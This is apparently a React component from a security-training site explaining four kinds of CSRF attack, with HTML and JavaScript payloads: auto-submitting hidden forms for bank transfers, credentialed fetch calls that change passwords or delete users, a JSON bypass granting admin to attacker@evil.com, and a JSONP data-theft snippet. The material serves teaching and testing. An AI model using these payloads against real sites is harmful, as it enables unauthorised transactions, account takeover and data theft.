
import React from 'react';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import CodeExample from '@/components/CodeExample';

const CSRFAttackTypes: React.FC = () => {
  return (
    <div>
      <h4 className="text-xl font-semibold mb-4">Types of CSRF Attacks</h4>
      <Tabs defaultValue="classic">
        <TabsList className="bg-slate-200 dark:bg-slate-800">
          <TabsTrigger value="classic">Classic CSRF</TabsTrigger>
          <TabsTrigger value="ajax">AJAX-based CSRF</TabsTrigger>
          <TabsTrigger value="json">JSON CSRF</TabsTrigger>
          <TabsTrigger value="login">Login CSRF</TabsTrigger>
        </TabsList>
        
        <TabsContent value="classic" className="mt-4">
          <div className="space-y-4">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">Classic Form-Based CSRF</h5>
              <p className="text-sm mb-3">
                Traditional CSRF attacks using HTML forms that automatically submit when the victim visits the attacker's page.
                These attacks work because browsers automatically include cookies with form submissions to the target domain.
              </p>
              
              <h6 className="font-medium mb-2">Attack Scenario:</h6>
              <CodeExample
                language="html"
                title="Malicious Website Code"
                code={`<!-- Attacker's website contains this hidden form -->
<form action="https://bank.example.com/transfer" method="POST" id="exploit-form">
  <input type="hidden" name="recipient" value="attacker-account">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="memo" value="Payment">
</form>

<script>
  // Automatically submit the form when page loads
  document.getElementById("exploit-form").submit();
</script>

<!-- Alternative methods -->
<!-- Image-based GET request -->
<img src="https://bank.example.com/transfer?to=attacker&amount=1000" style="display:none">

<!-- Link that triggers on hover -->
<a href="https://bank.example.com/delete-account" onmouseover="this.click()">Win a Prize!</a>`}
              />
              
              <h6 className="font-medium mb-2 mt-3">Testing Methodology:</h6>
              <ol className="list-decimal pl-6 space-y-1 text-sm">
                <li>Identify all state-changing forms and their required parameters</li>
                <li>Create a test HTML page with a form targeting the vulnerable endpoint</li>
                <li>Ensure you're logged into the target application in the same browser</li>
                <li>Visit your test page and check if the action was performed</li>
                <li>Monitor network traffic to confirm the request was sent with cookies</li>
              </ol>
            </div>
          </div>
        </TabsContent>
        
        <TabsContent value="ajax" className="mt-4">
          <div className="space-y-4">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">AJAX-Based CSRF</h5>
              <p className="text-sm mb-3">
                Modern CSRF attacks using JavaScript to make XMLHttpRequest or fetch API calls. 
                These are limited by the Same-Origin Policy but can still work for simple requests 
                or when CORS is misconfigured.
              </p>
              
              <h6 className="font-medium mb-2">Attack Examples:</h6>
              <CodeExample
                language="javascript"
                title="AJAX CSRF Attack"
                code={`// Simple CSRF using fetch API
fetch('https://vulnerable-site.com/api/change-password', {
  method: 'POST',
  credentials: 'include', // This includes cookies
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
  },
  body: 'new_password=hacked123&confirm_password=hacked123'
});

// CSRF with XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://vulnerable-site.com/api/transfer');
xhr.withCredentials = true; // Include cookies
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('recipient=attacker&amount=5000');

// CSRF via dynamically created form
function performCSRF() {
  var form = document.createElement('form');
  form.method = 'POST';
  form.action = 'https://vulnerable-site.com/admin/delete-user';
  
  var input = document.createElement('input');
  input.type = 'hidden';
  input.name = 'user_id';
  input.value = '123';
  
  form.appendChild(input);
  document.body.appendChild(form);
  form.submit();
}`}
              />
              
              <h6 className="font-medium mb-2 mt-3">Limitations and Bypasses:</h6>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Simple requests (GET, POST with specific content types) bypass CORS preflight</li>
                <li>Custom headers trigger preflight, but simple headers don't</li>
                <li>Misconfigured CORS policies may allow cross-origin requests</li>
                <li>WebSocket connections may not be subject to same restrictions</li>
              </ul>
            </div>
          </div>
        </TabsContent>
        
        <TabsContent value="json" className="mt-4">
          <div className="space-y-4">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">JSON CSRF Attacks</h5>
              <p className="text-sm mb-3">
                Attacks targeting APIs that accept JSON payloads. While these usually trigger CORS preflight checks,
                certain techniques can bypass these protections or exploit misconfigured CORS policies.
              </p>
              
              <h6 className="font-medium mb-2">Bypass Techniques:</h6>
              <CodeExample
                language="javascript"
                title="JSON CSRF Bypass Methods"
                code={`// Method 1: Using form with text/plain content type (simple request)
var form = document.createElement('form');
form.method = 'POST';
form.action = 'https://api.example.com/user/update';
form.enctype = 'text/plain';

var input = document.createElement('input');
input.name = '{"email":"attacker@evil.com","role":"admin"}';
input.value = '';
form.appendChild(input);

document.body.appendChild(form);
form.submit();

// Method 2: Exploiting Flash or other plugins
// Using Flash to send arbitrary content-type requests
var flashObject = document.createElement('object');
flashObject.data = 'https://attacker.com/csrf.swf';
// Flash can make requests without CORS restrictions

// Method 3: Exploiting JSONP endpoints
function jsonpCallback(data) {
  // This gets called with the response data
  console.log('Stolen data:', data);
}

var script = document.createElement('script');
script.src = 'https://vulnerable-site.com/api/user-data?callback=jsonpCallback';
document.head.appendChild(script);

// Method 4: Content-Type manipulation
// Some servers accept JSON with wrong content type
fetch('https://vulnerable-api.com/endpoint', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'json={"malicious":"payload"}'
});`}
              />
            </div>
          </div>
        </TabsContent>
        
        <TabsContent value="login" className="mt-4">
          <div className="space-y-4">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">Login CSRF</h5>
              <p className="text-sm mb-3">
                A variant where the attacker forces the victim to log into the attacker's account, 
                potentially allowing the attacker to access data the victim enters while logged into the wrong account.
              </p>
              
              <h6 className="font-medium mb-2">Attack Flow:</h6>
              <CodeExample
                language="html"
                title="Login CSRF Attack"
                code={`<!-- Force victim to log into attacker's account -->
<form action="https://target-site.com/login" method="POST" id="login-csrf">
  <input type="hidden" name="username" value="attacker-username">
  <input type="hidden" name="password" value="attacker-password">
</form>

<script>
  // Automatically submit login form
  document.getElementById("login-csrf").submit();
</script>

<!-- After this attack:
1. Victim is logged into attacker's account
2. Victim might enter sensitive information (credit card, etc.)
3. Attacker can later log in and see this information
4. Victim might not notice they're in the wrong account -->`}
              />
              
              <h6 className="font-medium mb-2 mt-3">Impact Scenarios:</h6>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Victim enters payment information into attacker's account</li>
                <li>Victim uploads files to attacker's cloud storage</li>
                <li>Victim's search history is saved to attacker's account</li>
                <li>Victim makes purchases that benefit the attacker</li>
              </ul>
            </div>
          </div>
        </TabsContent>
      </Tabs>
    </div>
  );
};

export default CSRFAttackTypes;
